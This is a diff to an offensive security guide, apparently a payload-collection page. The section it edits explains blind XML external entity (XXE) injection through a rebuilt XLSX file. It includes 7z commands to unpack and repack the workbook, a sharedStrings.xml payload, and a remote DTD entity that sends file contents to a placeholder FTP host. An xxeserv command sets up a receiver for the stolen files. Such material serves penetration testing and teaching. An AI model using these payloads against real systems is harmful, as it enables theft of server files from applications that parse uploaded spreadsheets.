@@ -506,21 +506,8 @@ GIF (experimental)
 Structure of the XLSX:
 
 ```
-$ 7z l xxe.xlsx      
-
-7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
-p7zip Version 17.04 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs x64)
-
-Scanning the drive for archives:
-1 file, 4758 bytes (5 KiB)
-
-Listing archive: xxe.xlsx
-
---
-Path = xxe.xlsx
-Type = zip
-Physical Size = 4758
-
+$ 7z l xxe.xlsx
+[...]
    Date      Time    Attr         Size   Compressed  Name
 ------------------- ----- ------------ ------------  ------------------------
 2021-10-17 15:19:00 .....          578          223  _rels/.rels
@@ -536,10 +523,13 @@ Physical Size = 4758
 2021-10-17 15:19:00              11216         3586  9 files
 ```
 
-Extract the excel file.
+Extract Excel file: `7z x -oXXE xxe.xlsx`
+
+Rebuild Excel file:
 
 ```
-$ 7z x -oXXE xxe.xlsx
+$ cd XXE
+$ 7z u ../xxe.xlsx *
 ```
 
 Add your blind XXE payload inside `xl/workbook.xml`.
@@ -559,13 +549,6 @@ Alternativly, add your payload in `xl/sharedStrings.xml`:
 <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
 ```
 
-Rebuild the Excel file.
-
-```
-$ cd XXE
-$ 7z u ../xxe.xlsx *
-```
-
 Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file.
 Instead we build the document once and then change the DTD.
 And using FTP instead of HTTP allows to retrieve much larger files.
@@ -577,7 +560,7 @@ And using FTP instead of HTTP allows to retrieve much larger files.
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>"> 
 ```
 
-Start the FTP + HTTP server:
+Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
 
 ```
 $ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
